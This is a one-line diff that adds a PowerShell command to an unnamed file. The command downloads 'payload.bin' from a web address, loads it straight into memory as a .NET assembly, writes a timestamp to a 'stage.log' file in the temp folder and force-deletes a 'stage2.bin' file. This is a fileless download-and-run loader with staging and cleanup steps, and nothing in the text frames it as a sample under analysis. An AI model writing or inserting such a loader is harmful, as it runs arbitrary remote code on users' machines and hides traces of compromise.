@@ -1,0 +1,1 @@
+$ManagedBytes = (New-Object System.Net.WebClient).DownloadData('https://example.org/payload.bin'); [Reflection.Assembly]::Load($ManagedBytes); Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append; Remove-Item -Path "$env:TEMP\stage2.bin" -Force
